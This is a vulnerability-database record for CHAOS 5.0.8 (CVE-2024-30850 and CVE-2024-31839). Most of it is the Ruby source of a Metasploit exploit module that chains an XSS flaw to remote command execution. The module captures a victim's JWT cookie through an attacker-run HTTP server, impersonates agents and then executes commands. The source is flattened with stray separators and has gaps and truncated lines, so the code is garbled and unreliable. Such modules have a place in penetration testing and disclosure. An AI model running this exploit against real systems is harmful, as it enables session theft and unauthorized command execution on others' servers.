{
    "text": "vul_url : https : /cxsecurity.com/issue/WLB-2024050071 ， vul_name : CHAOS 5.0.8 Cross Site Scripting / Remote Command Execution ， vul_date : 2024.05.22 ， vul_credit_name : h00die ， vul_risk : High ， vul_local : No ， vul_remote : Yes ， vul_cve : CVE-2024-30850 ， vul_cwe : CWE-79 CWE-78 ， vul_poc :  #  ，  # This module requires Metasploit : https : /metasploit.com/download ，  # Current source : https : /github.com/rapid7/metasploit-framework ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HttpServer : HTML ， include Rex : Proto : Http : WebSocket ， super (  ， update_info (  ， info ,  ， 'Name' => 'Chaos RAT XSS to RCE' ,  ， 'Description' => %q{ ， CHAOS v5.0.8 is a free and open-source Remote Administration Tool that ， allows generated binaries to control remote operating systems. The ， webapp contains a remote command execution vulnerability which ， can be triggered by an authenticated user when generating a new ， executable. The webapp also contains an XSS vulnerability within ， the view of a returned command being executed on an agent. ， Execution can happen through one of three routes :  ， 1. Provided credentials can be used to execute the RCE directly ， 2. A JWT token from an agent can be provided to emulate a compromised ， host. If a logged in user attempts to execute a command on the host ， the returned value contains an xss payload. ， 3. Similar to technique 2 , an agent executable can be provided and the ， JWT token can be extracted. ， Verified against CHAOS 7d5b20ad7e58e5b525abdcb3a12514b88e87cef2 running ， in a docker container. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'h00die' ,  # msf module ， 'chebuya' # original PoC , analysis ，  ]  ,  ， 'References' => [  ，  [ 'URL' , 'https : /github.com/chebuya/CVE-2024-30850-chaos-rat-rce-poc' ]  ,  ，  [ 'URL' , 'https : /github.com/tiagorlampert/CHAOS' ]  ,  ，  [ 'CVE' , '2024-31839' ]  ,  # XSS ，  [ 'CVE' , '2024-30850' ]  # RCE ，  ]  ,  ， 'Platform' => [ 'linux' , 'unix' ]  ,  ， 'Privileged' => false ,  ， 'Payload' => { 'BadChars' => ' ' } ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => [  ，  [ 'Automatic Target' , {} ]  ，  ]  ,  ， 'DefaultOptions' => { ， 'WfsDelay' => 3_600 ,  # 1hr ， 'URIPATH' => '/' # avoid long URLs in xss payloads ， } ,  ， 'DisclosureDate' => '2024-04-10' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ EVENT_DEPENDENT , REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK ]  ， } ， register_options (  ，  [  ， Opt : RPORT ( 8080 )  ,  ， OptString.new ( 'USERNAME' ,  [ false , 'User to login with' ]  )  ,  # admin ， OptString.new ( 'PASSWORD' ,  [ false , 'Password to login with' ]  )  ,  # admin ， OptString.new ( 'TARGETURI' ,  [ true , 'The URI of the Chaos Application' , '/' ]  )  ,  ， OptString.new ( 'JWT' ,  [ false , 'Agent JWT Token of the malware' ]  )  ,  ， OptPath.new ( 'AGENT' ,  [ false , 'A Chaos Agent Binary' ]  )  ，  ]  ， register_advanced_options (  ，  [  ， OptString.new ( 'AGENT_HOSTNAME' ,  [ false , 'Hostname for a fake agent' , 'DC01' ]  )  ,  ， OptString.new ( 'AGENT_USERNAME' ,  [ false , 'Username for a fake agent' , 'Administrator' ]  )  ,  ， OptString.new ( 'AGENT_USERID' ,  [ false , 'User ID for a fake agent' , 'Administrator' ]  )  ,  ， OptEnum.new ( 'AGENT_OS' ,  [ false , 'OS for a fake agent' , 'Windows' ,  [ 'Windows' , 'Linux' ]  )  ,  ，  ]  ， end ， vprint_status ( 'Received GET request.' )  ， cookie = request.uri.split ( 'jwt=' )  [ 1 ]  ， print_good ( \"Received cookie :  # {cookie}\" )  ， send_response_html ( cli , ' )  ，  @ xss_response_received = true ， list_agents ( cookie )  ， rce ( cookie )  ， end ， send_response_html ( cli , ' )  ， end ， def mac_address ，  @ mac_address | = Faker : Internet.mac_address ，  @ mac_address ， end ， def check ， res = send_request_cgi (  ， 'uri' => normalize_uri ( target_uri.path )  ,  ， 'method' => 'GET'",
    "time": null
}